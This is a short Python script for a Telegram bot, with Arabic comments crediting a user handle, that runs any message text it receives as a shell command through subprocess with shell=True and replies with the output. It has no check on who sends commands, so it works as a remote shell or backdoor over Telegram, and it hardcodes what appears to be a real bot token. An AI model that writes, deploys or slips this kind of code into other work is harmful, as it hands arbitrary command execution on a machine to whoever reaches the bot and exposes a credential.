import os 
try:
	import telebot 
except ImportError:
    os.system('pip install telebot')
    import telebot
import subprocess
# الحقوق محفوظه ل مارو @j_s_9 
TOKEN = "6796635661:AAGnviODW8qP2bfL7WzN-J3yd5OtJJ4yGzQ"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "مرحبًا! أنا هنا لتنفيذ الأوامر.")

@bot.message_handler(func=lambda message: not message.text.startswith('/'))
def execute_command(message):
    command = message.text
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        bot.reply_to(message, result)
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ: {str(e)}")

#  @j_s_9 956893993
if __name__ == '__main__':
    bot.polling()
